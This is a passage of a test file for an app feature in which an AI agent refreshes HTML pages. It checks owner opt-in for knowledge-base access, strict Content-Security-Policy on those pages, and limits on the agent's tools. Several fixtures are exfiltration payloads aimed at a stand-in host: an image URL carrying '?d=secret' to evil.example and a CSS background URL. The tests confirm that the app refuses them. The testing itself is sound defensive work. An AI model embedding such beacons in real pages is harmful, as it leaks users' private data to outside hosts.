    expect(saved.refresh.instructionSetBy).toBe('owner');
  });

  test('knowledge access is the owner\'s opt-in and switches the run from the web to the knowledge base', async () => {
    const a = await seed('knowledge');
    expect((await state(a.id)).knowledgeAccess).toBe(false);
    script.steps.push({ reply: PAGE });
    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
    await settled(a.id);
    expect(script.calls[0]?.knowledgeAccess).toBe(false);
    const res = await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { knowledgeAccess: true } });
    expect((await res.json()).refresh.knowledgeAccess).toBe(true);
    script.steps.push({ reply: PAGE });
    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
    await settled(a.id);
    expect(script.calls[1]?.knowledgeAccess).toBe(true);
  });

  test('PUT works without an instruction only to clear a schedule, and is refused in a shared space', async () => {
    const res = await call('POST', '/api/artifacts', { body: { slug: 'no-instruction', title: 'n', type: 'html', htmlTemplate: '<p>n</p>' } });
    const { artifact } = await res.json();
    const cleared = await call('PUT', `/api/artifacts/${artifact.id}/agent-refresh`, { body: { intervalMinutes: null } });
    expect(cleared.status).toBe(200);
    expect((await cleared.json()).refresh).toBeNull();
    expect((await call('PUT', `/api/artifacts/${artifact.id}/agent-refresh`, { body: { intervalMinutes: 60 } })).status).toBe(400);

    const { createSpace } = await import('@/core/spaces/service');
    const space = await createSpace({ userId: alice } as unknown as import('@/core/spaces/service').SpaceActor, { name: 'Refresh space' });
    const inSpace = (method: string, path: string, body?: unknown) => app.handle(new Request(`http://localhost${path}`, {
      method,
      headers: { authorization: `Bearer ${tokens[alice]}`, 'x-octipus-workspace': space.id, ...(body ? { 'content-type': 'application/json' } : {}) },
      body: body ? JSON.stringify(body) : undefined,
    }));
    const created = await inSpace('POST', '/api/artifacts', { slug: 'space-page', title: 's', type: 'html', htmlTemplate: '<p>s</p>' });
    expect(created.status).toBe(201);
    const spaceArtifact = (await created.json()).artifact;
    const put = await inSpace('PUT', `/api/artifacts/${spaceArtifact.id}/agent-refresh`, { instruction: 'anything' });
    expect(put.status).toBe(400);
    expect(await put.json()).toMatchObject({ code: 'refresh_unavailable' });
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    expect(await artifactRefreshRepository.get(spaceArtifact.id)).toBeNull();
  });
});

describe('a knowledge-base page reaches no network', () => {
  const ARTIFACT_HOST = 'artifacts.test';
  /** The embed's CSP header and the <meta> copy, in path mode and on the artifact host. */
  async function embedPolicies(slug: string): Promise<string[]> {
    const out: string[] = [];
    const path = await app.handle(new Request(`http://localhost/__artifacts__/a/${slug}/embed`, { headers: { authorization: `Bearer ${tokens[alice]}` } }));
    expect(path.status).toBe(200);
    out.push(path.headers.get('content-security-policy')!, /<meta http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(await path.text())![1].replace(/&#39;/g, '\'').replace(/&quot;/g, '"'));
    hosting.host = ARTIFACT_HOST;
    try {
      const sub = await app.handle(new Request(`http://localhost/a/${slug}/embed`, { headers: { host: ARTIFACT_HOST } }));
      expect(sub.status).toBe(200);
      out.push(sub.headers.get('content-security-policy')!, /<meta http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(await sub.text())![1].replace(/&#39;/g, '\'').replace(/&quot;/g, '"'));
    } finally {
      hosting.host = '';
    }
    return out;
  }
  const strict = (csp: string) => {
    expect(csp).not.toMatch(/https:|wss:|http:|\*/);
    expect(csp).toContain('connect-src \'none\'');
    expect(csp).toContain('img-src data: blob:');
    expect(csp).toMatch(/default-src 'none'/);
  };
  const normal = (csp: string) => expect(csp).toContain('img-src \'self\' data: https:');

  async function publicSeed(slug: string, knowledge: boolean) {
    const a = await seed(slug);
    expect((await call('PUT', `/api/artifacts/${a.id}`, { body: { visibility: 'public' } })).status).toBe(200);
    if (knowledge) expect((await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { knowledgeAccess: true } })).status).toBe(200);
    return a;
  }
  async function refreshWith(id: string, reply: string) {
    script.steps.push({ reply });
    expect((await call('POST', `/api/artifacts/${id}/agent-refresh/run`)).status).toBe(202);
    return settled(id);
  }

  test('its version gets the closed policy on every hosting path; turning knowledge off later does not loosen it', async () => {
    const a = await publicSeed('kb-strict', true);
    expect((await refreshWith(a.id, '```html\n<h1>From my notes</h1><img src="data:image/png;base64,AAAA">\n```')).lastOutcome).toBe('success');
    const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
    expect((await artifactsRepository.getVersion((await current(a.id)).versionId!))?.network).toBe('none');
    const policies = await embedPolicies('kb-strict');
    expect(policies).toHaveLength(4);
    for (const csp of policies) strict(csp);
    // No viewer token or SDK in a closed page.
    const html = await (await app.handle(new Request('http://localhost/__artifacts__/a/kb-strict/embed', { headers: { authorization: `Bearer ${tokens[alice]}` } }))).text();
    expect(html).not.toContain('octipus-artifact-token');
    expect(html).not.toContain('octipus-artifact-client.js');

    expect((await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { knowledgeAccess: false } })).status).toBe(200);
    for (const csp of await embedPolicies('kb-strict')) strict(csp);
    // A restore of that version stays closed.
    const kbVersion = (await current(a.id)).versionId!;
    expect((await call('POST', `/api/artifacts/${a.id}/versions/${a.versionId}/restore`)).status).toBe(200);
    for (const csp of await embedPolicies('kb-strict')) normal(csp);
    expect((await call('POST', `/api/artifacts/${a.id}/versions/${kbVersion}/restore`)).status).toBe(200);
    for (const csp of await embedPolicies('kb-strict')) strict(csp);
    // A hand edit is the owner's page again: the normal policy.
    expect((await call('PUT', `/api/artifacts/${a.id}`, { body: { htmlTemplate: '<p>by hand</p>' } })).status).toBe(200);
    for (const csp of await embedPolicies('kb-strict')) normal(csp);
  });

  test('web-mode and hand-made versions keep the existing policy', async () => {
    const a = await publicSeed('web-normal', false);
    const before = await embedPolicies('web-normal');
    for (const csp of before) normal(csp);
    expect((await refreshWith(a.id, PAGE)).lastOutcome).toBe('success');
    const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
    expect((await artifactsRepository.getVersion((await current(a.id)).versionId!))?.network).toBe('default');
    const after = await embedPolicies('web-normal');
    for (const csp of after) normal(csp);
    // Same policy apart from the bundle hash the refreshed page added.
    const strip = (csp: string) => csp.replace(/'sha256-[^']+'/g, '').replace(/\s+/g, ' ');
    expect(after.map(strip)).toEqual(before.map(strip));
  });

  test('a knowledge-base page with an external image or a script is refused, and the old version stays', async () => {
    const a = await publicSeed('kb-refused', true);
    const img = await refreshWith(a.id, '```html\n<h1>Notes</h1><img src="https://evil.example/p.gif?d=secret">\n```');
    expect(img.lastOutcome).toBe('failed');
    expect(img.lastError).toMatch(/self-contained page.*src="https:\/\/evil\.example\/p\.gif\?d=secret"/);
    const css = await refreshWith(a.id, '```html\n<h1>Notes</h1>\n```\n```css\nbody { background: url(//evil.example/b.png); }\n```');
    expect(css.lastError).toMatch(/url\(\/\/evil\.example\/b\.png\)/);
    const js = await refreshWith(a.id, '```html\n<h1>Notes</h1><script>location = "/x";</script>\n```');
    expect(js.lastError).toMatch(/without JavaScript/);
    expect(await current(a.id)).toEqual({ versionId: a.versionId, versions: 1 });
    for (const csp of await embedPolicies('kb-refused')) normal(csp);
  });
});

describe('the real runner', () => {
  async function runReal(slug: string, knowledgeAccess: boolean) {
    const a = await seed(slug, 'Top 3 headlines');
    const spawn = vi.fn(async () => '```html\n<p>new</p>\n```');
    worker.spawn = spawn;
    const actual = await vi.importActual<typeof import('./agent-refresh-runner')>('./agent-refresh-runner');
    const sessions: string[] = [];
    const out = await actual.runRefreshAgent({
      artifactId: a.id,
      workspaceId: a.workspaceId,
      ownerUserId: alice,
      title: slug,
      instruction: 'Top 3 headlines',
      knowledgeAccess,
      trigger: 'schedule',
      sessionId: null,
      signal: new AbortController().signal,
      onSession: async (id) => { sessions.push(id); },
    });
    expect(out).toContain('<p>new</p>');
    expect(sessions).toHaveLength(1);
    expect(spawn).toHaveBeenCalledTimes(1);
    const [role, task, input, parent, opts] = spawn.mock.calls[0] as unknown as [string, string, string, import('@/core/types').AgentContext, { toolIds: string[]; exactTools: boolean }];
    expect(role).toBe('research');
    expect(input).toBe('');
    expect(task).toBe(actual.buildRefreshTask(slug, 'Top 3 headlines', knowledgeAccess));
    expect(task).not.toContain('<p>old</p>');
    expect(parent).toMatchObject({ userId: alice, sessionId: sessions[0], workspaceId: a.workspaceId, attended: false, trigger: 'schedule', funding: 'own' });
    expect(opts.exactTools).toBe(true);
    return { actual, toolIds: opts.toolIds };
  }

  test('by default the run gets the web tools only: no knowledge base, no artifact tools', async () => {
    const { actual, toolIds } = await runReal('real-web', false);
    expect(toolIds).toEqual([...actual.REFRESH_WEB_TOOLS]);
    expect(toolIds.some((t) => t.startsWith('knowledge') || t.startsWith('artifacts'))).toBe(false);
  });

  test('with knowledge access the run gets the knowledge tools only: no web tools', async () => {
    const { actual, toolIds } = await runReal('real-knowledge', true);
    expect(toolIds).toEqual([...actual.REFRESH_KNOWLEDGE_TOOLS]);
    expect(toolIds.some((t) => t.startsWith('websearch') || t.startsWith('artifacts'))).toBe(false);
  });
});
